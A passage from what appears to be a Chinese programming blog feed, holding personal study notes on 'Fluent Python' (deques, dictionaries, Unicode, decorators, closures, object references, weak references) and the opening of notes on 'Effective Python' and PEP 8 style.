➌</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>dq</span><br><span class="line">deque([-<span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>], maxlen=<span class="number">10</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>dq.extend([<span class="number">11</span>, <span class="number">22</span>, <span class="number">33</span>]) ➍</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>dq</span><br><span class="line">deque([<span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">11</span>, <span class="number">22</span>, <span class="number">33</span>], maxlen=<span class="number">10</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>dq.extendleft([<span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>, <span class="number">40</span>]) ➎</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>dq</span><br><span class="line">deque([<span class="number">40</span>, <span class="number">30</span>, <span class="number">20</span>, <span class="number">10</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>], maxlen=<span class="number">10</span>)</span><br></pre></td></tr></table></figure>
<ul>
<li>maxlen是一个可选参数，代表队列可以容纳的元素数量，一旦设定不可修改</li>
<li>rotate操作接受一个参数n，当n &gt; 0时，最右边n个元素移动到最左，n &lt; 0, 最左边n个元素移动到最右</li>
</ul>
<p>除了deque，其他Python标准库也有对队列的实现</p>
<ul>
<li>queue</li>
<li>multiprocessing 实现了自己的Queue</li>
<li>asyncio</li>
<li>heapq</li>
</ul>
<h3 id="x20-sorted-list-sort背后的排序算法-Timsort"><a href="#x20-sorted-list-sort背后的排序算法-Timsort" class="headerlink" title="&#x20;sorted, list.sort背后的排序算法 Timsort"></a>&#x20;sorted, list.sort背后的排序算法 Timsort</h3><p>Timsort是一种自适应排序算法，会根据原始数据的顺序特点交替用插入排序和归并排序，以达到最佳效率</p>
<h2 id="第3章-字典和集合"><a href="#第3章-字典和集合" class="headerlink" title="第3章 字典和集合"></a>第3章 字典和集合</h2><h3 id="可散列的数据类型"><a href="#可散列的数据类型" class="headerlink" title="可散列的数据类型"></a>可散列的数据类型</h3><ul>
<li>如一个对象时可散列的，在这个对象的生命周期中，它的散列值是不变的，而且这个对象需要实现hash方法，另外可散列对象要有qe方法，才能跟其他键做比较</li>
<li>原子不可变数据类型(str, bytes, 数值类型）都是可散列类型, frozenset也是可散列的</li>
<li>对于元组，只有当一个元组包含所有元素都是可散列类型情况下，它才是可散列的</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>ttt = (<span class="number">1</span>, <span class="number">2</span>, (<span class="number">30</span>, <span class="number">40</span>))</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">hash</span>(ttt)</span><br><span class="line">-<span class="number">3907003130834322577</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>t2 = (<span class="number">1</span>, <span class="number">2</span>, [<span class="number">30</span>, <span class="number">40</span>])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">hash</span>(t2)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">TypeError: unhashable <span class="built_in">type</span>: <span class="string">&#x27;list&#x27;</span></span><br></pre></td></tr></table></figure>

<h3 id="x20-字典的构造方法"><a href="#x20-字典的构造方法" class="headerlink" title="&#x20;字典的构造方法"></a>&#x20;字典的构造方法</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a =  <span class="built_in">dict</span>(one=<span class="number">1</span>, two=<span class="number">2</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b = &#123;<span class="string">&#x27;one&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;two&#x27;</span>: <span class="number">2</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>c = <span class="built_in">dict</span>(<span class="built_in">zip</span>([<span class="string">&#x27;one&#x27;</span>, <span class="string">&#x27;two&#x27;</span>], [<span class="number">1</span>,<span class="number">2</span>]))</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>d = <span class="built_in">dict</span>([(<span class="string">&#x27;one&#x27;</span>,<span class="number">1</span>), (<span class="string">&#x27;two&#x27;</span>,<span class="number">2</span>)])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>e = <span class="built_in">dict</span>(&#123;<span class="string">&#x27;one&#x27;</span>:<span class="number">1</span>, <span class="string">&#x27;two&#x27;</span>:<span class="number">2</span>&#125;)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a == b == c == d == e</span><br><span class="line"><span class="literal">True</span></span><br></pre></td></tr></table></figure>

<h3 id="字典推导"><a href="#字典推导" class="headerlink" title="字典推导"></a>字典推导</h3><p>字典推导可以从任何以键值对作为元素可迭代对象中构建出字典</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>array = [(<span class="string">&#x27;one&#x27;</span>, <span class="number">1</span>), (<span class="string">&#x27;two&#x27;</span>, <span class="number">2</span>), (<span class="string">&#x27;three&#x27;</span>, <span class="number">3</span>)]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>dic = &#123;k: v <span class="keyword">for</span> v, k <span class="keyword">in</span> array&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>dic</span><br><span class="line">&#123;<span class="number">1</span>: <span class="string">&#x27;one&#x27;</span>, <span class="number">2</span>: <span class="string">&#x27;two&#x27;</span>, <span class="number">3</span>: <span class="string">&#x27;three&#x27;</span>&#125;</span><br></pre></td></tr></table></figure>

<h3 id="用setdefault处理找不到的键"><a href="#用setdefault处理找不到的键" class="headerlink" title="用setdefault处理找不到的键"></a>用setdefault处理找不到的键</h3><p>以下两种写法是等价的</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> key <span class="keyword">not</span> <span class="keyword">in</span> my_dict:</span><br><span class="line">	my_dict[key] = []</span><br><span class="line">my_dicy[key].append(new_value)</span><br><span class="line"></span><br><span class="line">my_dict.setdefault(key, []).append(new_value)</span><br></pre></td></tr></table></figure>

<p>也可以用get方法获得key对应的value，如果不存在返回默认值</p>
<pre><code>&gt;&gt;&gt; dic = &#123; 1: &#39;one&#39;&#125;
&gt;&gt;&gt; dic.get(2, &#39;N/A&#39;)
&#39;N/A&#39;
</code></pre>
<h3 id="字典的变种"><a href="#字典的变种" class="headerlink" title="字典的变种"></a>字典的变种</h3><p>collections.OrderedDict</p>
<p>添加key时会保持顺序</p>
<p>collections.ChainMap</p>
<p>容纳数个不同映射对象，进行key查找时，这些对象会被当做一个整体被逐个查找</p>
<h3 id="不可变映射类型"><a href="#不可变映射类型" class="headerlink" title="不可变映射类型"></a>不可变映射类型</h3><p>MappingProxyType</p>
<h3 id="集合论"><a href="#集合论" class="headerlink" title="集合论"></a>集合论</h3><p>set和它的不可变姊妹类型frozenset，集合中元素必须是可散列的</p>
<p>创建空集合用 set(), frozenset({0,1,2,3})</p>
<h3 id="往字典里添加新键可能会改变已有键顺序"><a href="#往字典里添加新键可能会改变已有键顺序" class="headerlink" title="往字典里添加新键可能会改变已有键顺序"></a>往字典里添加新键可能会改变已有键顺序</h3><p>不要对字典同时进行迭代和修改，最好分两步：首先对字典迭代，得出要添加内容，把这些内容放在一个新字典里，迭代结束后再对原有字典进行更新</p>
<h2 id="第4章-文本和字节序列"><a href="#第4章-文本和字节序列" class="headerlink" title="第4章 文本和字节序列"></a>第4章 文本和字节序列</h2><ul>
<li>字符、码位和字节表述&#x20;</li>
<li>bytes、bytearray 和 memoryview 等二进制序列的独特特性&#x20;</li>
<li>全部 Unicode 和陈旧字符集的编解码器&#x20;</li>
<li>避免和处理编码错误&#x20;</li>
<li>处理文本文件的最佳实践&#x20;</li>
<li>默认编码的陷阱和标准 I&#x2F;O 的问题&#x20;</li>
<li>规范化 Unicode 文本，进行安全的比较&#x20;</li>
<li>规范化、大小写折叠和暴力移除音调符号的实用函数&#x20;</li>
<li>使用 locale 模块和 PyUCA 库正确地排序 Unicode 文本&#x20;</li>
<li>Unicode 数据库中的字符元数据 能处理字符串和字节序列的双模式 API</li>
</ul>
<p>字符串是一个字符序列，从Python3的str对下井获取元素是Unicode字符，Unicode标准把字符的标识和具体字节表述进行如下明确区分</p>
<ul>
<li>字符标识，即码位，是0-1114111的数字，在Unicode标准中以4-6个十六进制数字表示，加前缀U+, 例如字母A的码位是U+0041，欧元符号码位阿是U+20AC</li>
<li>字符具体表述取决于所用编码，UTF-8中, A(U+0041)的码位编码成单个字节\x41, 而在UTF-16LE编码中编成两个字节\x41\x00</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>s = <span class="string">&#x27;café&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">len</span>(s)</span><br><span class="line"><span class="number">4</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b = s.encode(<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b</span><br><span class="line"><span class="string">b&#x27;caf\xc3\xa9&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">len</span>(b)</span><br><span class="line"><span class="number">5</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b.decode(<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;café&#x27;</span></span><br></pre></td></tr></table></figure>

<h3 id="字节概要"><a href="#字节概要" class="headerlink" title="字节概要"></a>字节概要</h3><p>Python内置两种基本二进制序列类型： bytes, bytearray</p>
<h3 id="BOM是什么"><a href="#BOM是什么" class="headerlink" title="BOM是什么"></a>BOM是什么</h3><p>字节序标记 byte-order mark</p>
<h2 id="x20-第7章-函数装饰器和闭包"><a href="#x20-第7章-函数装饰器和闭包" class="headerlink" title="&#x20;第7章 函数装饰器和闭包"></a>&#x20;第7章 函数装饰器和闭包</h2><p>装饰器特性，能把被装饰的函数替换成其他函数， 第二个特性：装饰器在加载模块时立即执行</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">deco</span>(<span class="params">func</span>):</span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">inner</span>():</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&#x27;running inner()&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> inner</span><br><span class="line"><span class="meta">@deco</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">target</span>():</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&#x27;running target()&#x27;</span>)</span><br><span class="line"></span><br><span class="line">target()</span><br><span class="line">running inner()</span><br></pre></td></tr></table></figure>

<p>打印函数运行时间</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calc_time</span>(<span class="params">func</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">wrapper</span>(<span class="params">*args, **kwargs</span>):</span><br><span class="line">        t1 = time.time()</span><br><span class="line">        func(*args, **kwargs)</span><br><span class="line">        t2 = time.time()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;func &#123;&#125; costs &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(func.__name__, t2 - t1))</span><br><span class="line">    <span class="keyword">return</span> wrapper</span><br><span class="line"></span><br><span class="line"><span class="meta">@calc_time</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">a, b</span>):</span><br><span class="line">    time.sleep(<span class="number">5</span>)</span><br><span class="line">    <span class="keyword">return</span> a + b</span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>, <span class="number">2</span>)</span><br><span class="line">$ python calc.py</span><br><span class="line">func add costs <span class="number">5.014971017837524</span></span><br></pre></td></tr></table></figure>

<h3 id="为什么用闭包"><a href="#为什么用闭包" class="headerlink" title="为什么用闭包"></a>为什么用闭包</h3><p>举例：求平均数，每次调用avg，新增一个数并重新计算平均值</p>
<p>实现方法1：缺点是需定义全局变量</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">total = <span class="number">0</span></span><br><span class="line">count = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">avg</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="keyword">global</span> total,count</span><br><span class="line">    total += n</span><br><span class="line">    count += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> total / count</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(avg(<span class="number">10</span>))</span><br><span class="line"><span class="built_in">print</span>(avg(<span class="number">11</span>))</span><br></pre></td></tr></table></figure>

<p>实现方法2：使用类，缺点是麻烦</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Aver</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.series = []</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__call__</span>(<span class="params">self, value</span>):</span><br><span class="line">        <span class="variable language_">self</span>.series.append(value)</span><br><span class="line">        total = <span class="built_in">sum</span>(<span class="variable language_">self</span>.series)</span><br><span class="line">        <span class="keyword">return</span> total/<span class="built_in">len</span>(<span class="variable language_">self</span>.series)</span><br><span class="line"></span><br><span class="line">avg = Aver()</span><br><span class="line"><span class="built_in">print</span>(avg(<span class="number">10</span>))</span><br><span class="line"><span class="built_in">print</span>(avg(<span class="number">11</span>))</span><br></pre></td></tr></table></figure>

<p>实现方法3：用函数，引入nonocal声明</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">make_aver</span>():</span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    total = <span class="number">0</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">aver</span>(<span class="params">val</span>):</span><br><span class="line">        <span class="keyword">nonlocal</span> count</span><br><span class="line">        <span class="keyword">nonlocal</span> total</span><br><span class="line">        count += <span class="number">1</span></span><br><span class="line">        total += val</span><br><span class="line">        <span class="keyword">return</span> total / count</span><br><span class="line">    <span class="keyword">return</span> aver</span><br><span class="line"></span><br><span class="line">avg = make_aver()</span><br><span class="line"><span class="built_in">print</span>(avg(<span class="number">10</span>))</span><br><span class="line"><span class="built_in">print</span>(avg(<span class="number">11</span>))</span><br></pre></td></tr></table></figure>

<h3 id="闭包和匿名函数区别"><a href="#闭包和匿名函数区别" class="headerlink" title="闭包和匿名函数区别"></a>闭包和匿名函数区别</h3><h2 id="第8章-对象引用、可变性和垃圾回收"><a href="#第8章-对象引用、可变性和垃圾回收" class="headerlink" title="第8章 对象引用、可变性和垃圾回收"></a>第8章 对象引用、可变性和垃圾回收</h2><h3 id="x20-默认做浅复制"><a href="#x20-默认做浅复制" class="headerlink" title="&#x20;默认做浅复制"></a>&#x20;默认做浅复制</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">l1 = [<span class="number">3</span>, [<span class="number">66</span>,<span class="number">55</span>,<span class="number">44</span>], (<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>)]</span><br><span class="line">l2 = <span class="built_in">list</span>(l1)</span><br><span class="line">l1.append(<span class="number">100</span>)</span><br><span class="line">l1[<span class="number">1</span>].remove(<span class="number">55</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>l1 = [<span class="number">3</span>, [<span class="number">66</span>,<span class="number">44</span>], (<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>), <span class="number">100</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>l2 = [<span class="number">3</span>, [<span class="number">66</span>,<span class="number">44</span>], (<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>)]</span><br><span class="line">l2[<span class="number">1</span>] += [<span class="number">33</span>,<span class="number">22</span>]</span><br><span class="line">l2[<span class="number">2</span>] += (<span class="number">10</span>,<span class="number">11</span>)</span><br><span class="line">[<span class="number">3</span>, [<span class="number">66</span>,<span class="number">44</span>,<span class="number">33</span>,<span class="number">22</span>], (<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>), <span class="number">100</span>]</span><br><span class="line">[<span class="number">3</span>, [<span class="number">66</span>,<span class="number">44</span>,<span class="number">33</span>,<span class="number">22</span>], (<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>), <span class="number">100</span>]</span><br></pre></td></tr></table></figure>

<ul>
<li>对可变对象来说，l2[1]引用的列表， +&#x3D;运算符就地修改列表，修改在l1[1]中也有体现</li>
<li>对元组来说，+&#x3D;创建一个新元组，然后重新绑定给变量l2[2]</li>
</ul>
<h3 id="不要使用可变类型作为参数默认值"><a href="#不要使用可变类型作为参数默认值" class="headerlink" title="不要使用可变类型作为参数默认值"></a>不要使用可变类型作为参数默认值</h3><h3 id="防御可变参数"><a href="#防御可变参数" class="headerlink" title="防御可变参数"></a>防御可变参数</h3><p>如果定义函数接收可变参数，应该谨慎考虑调用方是否期望修改传入参数</p>
<p>例：从TwilightBus下车后，乘客消失了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Bus</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, passengers=<span class="literal">None</span></span>):</span><br><span class="line">        <span class="keyword">if</span> passengers <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="variable language_">self</span>.passengers = []</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="variable language_">self</span>.passengers = passengers</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">drop</span>(<span class="params">self, name</span>):</span><br><span class="line">        <span class="variable language_">self</span>.passengers.remove(name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">basketball_team = [<span class="string">&#x27;Sue&#x27;</span>, <span class="string">&#x27;Tina&#x27;</span>, <span class="string">&#x27;Maya&#x27;</span>]</span><br><span class="line">bus = Bus(basketball_team)</span><br><span class="line">bus.drop(<span class="string">&#x27;Tina&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(basketball_team)</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>[<span class="string">&#x27;Sue&#x27;</span>, <span class="string">&#x27;Maya&#x27;</span>]</span><br></pre></td></tr></table></figure>

<h3 id="del和垃圾回收"><a href="#del和垃圾回收" class="headerlink" title="del和垃圾回收"></a>del和垃圾回收</h3><p>对象不会自行销毁，然而无法得到对象时，可能被当做垃圾回收</p>
<p>del语句删除名称，而不是对象，举例：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> weakref</span><br><span class="line">s1 = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125;</span><br><span class="line">s2 = s1</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bye</span>():</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&#x27;Gone with the wind...&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>ender = weakref.finalize(s1, bye)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>ender.alive</span><br><span class="line"><span class="literal">True</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">del</span> s1</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>ender.alive</span><br><span class="line"><span class="literal">True</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s2 = <span class="string">&#x27;spam&#x27;</span></span><br><span class="line">Gone <span class="keyword">with</span> the wind...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>ender.alive</span><br><span class="line"><span class="literal">False</span></span><br></pre></td></tr></table></figure>

<h3 id="x20-弱引用"><a href="#x20-弱引用" class="headerlink" title="&#x20;弱引用"></a>&#x20;弱引用</h3><p>当对象的饮用数量归零后，垃圾回收程序会把对象销毁，但是，有时需要引用对象，而不让对象存在时间超过所需时间，这经常用在缓存中</p>
<p>弱引用不会增加对象引用数量，引用的目标对象称为所指对象，因此我们说，弱引用不会妨碍所指对象被当做垃圾回收</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> weakref</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a_set = &#123;<span class="number">0</span>, <span class="number">1</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>wref = weakref.ref(a_set)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>wref</span><br><span class="line">&lt;weakref at <span class="number">0x100637598</span>; to <span class="string">&#x27;set&#x27;</span> at <span class="number">0x100636748</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>wref()</span><br><span class="line">&#123;<span class="number">0</span>, <span class="number">1</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a_set = &#123;<span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>wref()</span><br><span class="line">&#123;<span class="number">0</span>, <span class="number">1</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>wref() <span class="keyword">is</span> <span class="literal">None</span></span><br><span class="line"><span class="literal">False</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>wref() <span class="keyword">is</span> <span class="literal">None</span></span><br><span class="line"><span class="literal">True</span></span><br></pre></td></tr></table></figure>

<h3 id="x20-Python对不可变类型施加的把戏"><a href="#x20-Python对不可变类型施加的把戏" class="headerlink" title="&#x20;Python对不可变类型施加的把戏"></a>&#x20;Python对不可变类型施加的把戏</h3><p>例：使用另一个元组构建元组，得到的是同一个元组</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>t1 = (<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>t2 = <span class="built_in">tuple</span>(t1)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>t2 <span class="keyword">is</span> t1</span><br><span class="line"><span class="literal">True</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>t3 = t1[:]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>t3 <span class="keyword">is</span> t1</span><br><span class="line"><span class="literal">True</span></span><br></pre></td></tr></table></figure>

<p>例：字符串字面量可能会创建共享的对象</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>t1 = (<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>t3 = (<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>t3 <span class="keyword">is</span> t1</span><br><span class="line"><span class="literal">False</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s1 = <span class="string">&#x27;ABC&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s2 = <span class="string">&#x27;ABC&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s2 <span class="keyword">is</span> s1</span><br><span class="line"><span class="literal">True</span></span><br></pre></td></tr></table></figure>

<h2 id="第9章-符合Python风格的对象"><a href="#第9章-符合Python风格的对象" class="headerlink" title="第9章 符合Python风格的对象"></a>第9章 符合Python风格的对象</h2><p>讨论两个概念：</p>
<ul>
<li>如何以及何时使用@classmethod和@staticmethod装饰器</li>
<li>Python的私有属性和受保护属性的用法，约定和局限</li>
</ul>
<h3 id="classmethod和staticmethod"><a href="#classmethod和staticmethod" class="headerlink" title="classmethod和staticmethod"></a>classmethod和staticmethod</h3><ul>
<li>classmethod定义了操作类，而不是操作实例的方法, (参数没有this)</li>
<li>staticmethod就是普通函数，不过它碰巧在类的定义中体现 (不太有用）</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Demo</span>:</span><br><span class="line"><span class="meta">	@classmethod</span></span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">klassmeth</span>(<span class="params">*args</span>):</span><br><span class="line">		<span class="keyword">return</span> args</span><br><span class="line"><span class="meta">	@staticmethod(<span class="params">*args</span>):</span></span><br><span class="line">		<span class="keyword">return</span> args</span><br></pre></td></tr></table></figure>

<p><a href="https://julien.danjou.info/blog/2013/guide-python-static-class-abstract-methods">https://julien.danjou.info/blog/2013/guide-python-static-class-abstract-methods</a></p>
<h3 id="Python的私有属性和受保护的属性"><a href="#Python的私有属性和受保护的属性" class="headerlink" title="Python的私有属性和受保护的属性"></a>Python的私有属性和受保护的属性</h3><ul>
<li>_private_attrs：两个下划线开头，声明该属性为私有，不能在类地外部被使用或直接访问。 在类内部的方法中使用时 self.__private_attrs</li>
<li>__private_method：两个下划线开头，声明该方法为私有方法，不能在类地外部调用</li>
</ul>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>Effective Python 笔记</title>
    <url>/2023/08/12/2023-08-12-effective-python-note/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>不错的Python进阶书。写这个笔记的目的是，把书中提到的编写高质量Python的59个方法的要点记录下来，便于今后的工作中查阅</p>
<h1 id="第1章：用Pythonic方式来思考"><a href="#第1章：用Pythonic方式来思考" class="headerlink" title="第1章：用Pythonic方式来思考"></a>第1章：用Pythonic方式来思考</h1><span id="more"></span>

<h2 id="x20-1-用Pythonic方式来思考"><a href="#x20-1-用Pythonic方式来思考" class="headerlink" title="&#x20;1. 用Pythonic方式来思考"></a>&#x20;1. 用Pythonic方式来思考</h2><p>python之禅 —— <code>import this</code></p>
<h2 id="x20-2-遵循PEP8风格"><a href="#x20-2-遵循PEP8风格" class="headerlink" title="&#x20;2. 遵循PEP8风格"></a>&#x20;2. 遵循PEP8风格</h2><p>PEP8 —— Python Enhancement Proposal #8</p>
<p>空白：</p>
<ul>
<li>使用空格而不是tab表示缩进</li>
<li>和语法相关每一层缩进用4个空格</li>
<li>每行字符数不超过79</li>
<li>占据多行表达式，除首行外其余各行应在通常缩进级别上加4空格</li>
<li>函数与类之间两个空行隔开</li>
<li>同一个类中，各方法一个空行隔开</li>
<li>使用下标获取元素，不要在两旁加空格</li>
<li>为变量赋值，赋值符号左侧和右侧各自写一个空格，不要在两旁添加空格</li>
</ul>
<p>命名：</p>
<ul>
<li>函数、变量、属性用小写，各单词以下划线连接</li>
<li>受保护实例属性，以单下划线开头</li>
<li>私有实例属性：以两个下划线开头</li>
<li>类以异常，应每个单词以大写形式命名，如CapitalizedWord</li>
<li>模块级别常量，应全部采用大写，各单词以下划线相连，如ALL_CAPS</li>
<li>类中实例方法，应该把首个参数命名为self，以表示对象自身</li>
<li>类方法首个参数，应该命名为cls，以表示类自身</li>
</ul>
<p>表达式和语句：</p>
<ul>
<li>采用内联形式否定词，而不是把否定词放在整个表达式前面，例如写if a is not b 而不是 if not a is b</li>
<li>不要通过测长度方法判断list是否为空，应采用if not list，空值会自动评估为False</li>
<li>import语句总应放在文件开头</li>
<li>引入模块时总应使用绝对名称，不应根据当前模块路径使用相对名称，例如引入bar包中的foo模块，应完整写出from bar import foo，不应该简写import foo</li>
<li>文件中import语句应按顺序划三部分，分别表示标准库模块，第三方模块，自用模块，各部分中的import语句应按模块的字母顺序排列</li>
</ul>
<h2 id="3-了解bytes-str-unicode区别"><a href="#3-了解bytes-str-unicode区别" class="headerlink" title="3. 了解bytes, str, unicode区别"></a>3. 了解bytes, str, unicode区别</h2><ul>
<li>Python3中，bytes是一个包含8位置的序列，str是一种包含unicode字符序列</li>
</ul>
<h2 id="4-用辅助函数取代复杂表达式"><a href="#4-用辅助函数取代复杂表达式" class="headerlink" title="4. 用辅助函数取代复杂表达式"></a>4. 用辅助函数取代复杂表达式</h2><p>开发者容易过度运用Python语法特性，写出特别复杂难以理解的单行表达式。<strong>这种情况需要把复杂表达式移到辅助函数</strong></p>
